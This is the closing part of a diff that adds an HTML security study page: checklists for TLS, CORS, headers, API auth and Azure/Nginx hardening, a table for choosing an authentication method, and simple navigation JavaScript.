+        <li>TLS 1.2+ only (TLS 1.0/1.1 disabled in Nginx)</li>
+        <li>Secure cookies have Secure flag set</li>
+        <li>CORS allow_origins is a specific list, not wildcard *</li>
+        <li>CORS credentials not used with wildcard origins</li>
+        <li>X-Content-Type-Options: nosniff header set</li>
+        <li>X-Frame-Options: DENY header set (anti-clickjacking)</li>
+        <li>Content-Security-Policy header configured</li>
+      </ul>
+    </div>
+  </div>
+
+  <div class="acc" onclick="toggleAcc(this)">
+    <div class="acc-h">✅ API &amp; Endpoints <span class="acc-ico">+</span></div>
+    <div class="acc-b">
+      <ul class="list">
+        <li>All endpoints require authentication (none left open by accident)</li>
+        <li>All endpoints have authorization checks (not just AuthN)</li>
+        <li>Rate limiting on auth endpoints (login, register, reset)</li>
+        <li>Input validated with Pydantic (FastAPI) or serializers (DRF)</li>
+        <li>SQL queries use ORM/parameterized (no string formatting)</li>
+        <li>Webhook signatures verified before processing</li>
+        <li>Internal endpoints blocked at Nginx level</li>
+        <li>Admin URL non-obvious and IP-restricted</li>
+        <li>Audit logs for all admin actions</li>
+        <li>secrets.compare_digest used for all secret comparisons</li>
+      </ul>
+    </div>
+  </div>
+
+  <div class="acc" onclick="toggleAcc(this)">
+    <div class="acc-h">✅ Infrastructure (Azure + Nginx) <span class="acc-ico">+</span></div>
+    <div class="acc-b">
+      <ul class="list">
+        <li>NSG rules: only ports 80, 443, 22 (your IP) open to internet</li>
+        <li>Internal service ports blocked at NSG level</li>
+        <li>All secrets in Azure Key Vault</li>
+        <li>Azure VM using Managed Identity (no credentials needed for Azure services)</li>
+        <li>Nginx rate limiting configured for auth and API routes</li>
+        <li>Admin paths IP-whitelisted in Nginx</li>
+        <li>SSH key-based auth only (no password SSH)</li>
+        <li>OS and packages regularly updated (security patches)</li>
+        <li>Error messages don't expose stack traces or system info</li>
+        <li>Logging enabled for auth events (login, failed login, logout, token refresh)</li>
+      </ul>
+    </div>
+  </div>
+
+  <h2>Quick decision guide: which auth method to use?</h2>
+  <div class="tw"><table>
+    <thead><tr><th>Scenario</th><th>Recommended method</th></tr></thead>
+    <tbody>
+      <tr><td>User logs into your web app</td><td>JWT (access) + HttpOnly cookie (refresh) + HTTPS</td></tr>
+      <tr><td>Your FastAPI calls your Django service</td><td>Per-service API key or service JWT (short-lived)</td></tr>
+      <tr><td>External webhook (LiveKit/Stripe calls you)</td><td>HMAC signature verification on raw body</td></tr>
+      <tr><td>WebSocket real-time connection</td><td>JWT as query param at handshake, short-lived token</td></tr>
+      <tr><td>Social login (Google/GitHub)</td><td>OAuth 2.0 Authorization Code + PKCE → issue your own JWT</td></tr>
+      <tr><td>Enterprise SSO (company AD)</td><td>OpenID Connect (OIDC) via Azure AD or Okta</td></tr>
+      <tr><td>Admin CLI tool</td><td>API key or basic auth (over HTTPS, internal network only)</td></tr>
+      <tr><td>Protect LiveKit WebRTC room</td><td>JWT-gated token endpoint → LiveKit access token</td></tr>
+      <tr><td>Simple internal microservice</td><td>Shared secret + NSG/firewall to block external access</td></tr>
+    </tbody>
+  </table></div>
+
+  <div class="callout q3"><strong>Remember the security mindset:</strong> Authentication is not a feature you add once — it's a discipline you maintain. Rotate secrets regularly, audit access logs, keep dependencies updated, and assume breach: design your system so that even if one layer fails, others catch it.</div>
+</section>
+
+</main>
+</div>
+
+<script>
+function go(id){
+  document.querySelectorAll('.sec').forEach(s=>s.classList.remove('on'));
+  document.querySelectorAll('.ni').forEach(n=>n.classList.remove('on'));
+  const sec = document.getElementById('sec-'+id);
+  if(sec) sec.classList.add('on');
+  if(event&&event.currentTarget) event.currentTarget.classList.add('on');
+  window.scrollTo({top:0,behavior:'smooth'});
+  if(window.innerWidth<=700) closeSb();
+}
+function toggleAcc(el){el.classList.toggle('open')}
+const sb=document.getElementById('sb'),ov=document.getElementById('ov'),hbg=document.getElementById('hbg');
+function openSb(){sb.classList.add('open');ov.classList.add('open')}
+function closeSb(){sb.classList.remove('open');ov.classList.remove('open')}
+hbg.addEventListener('click',()=>sb.classList.contains('open')?closeSb():openSb());
+ov.addEventListener('click',closeSb);
+</script>
+</body>
+</html>
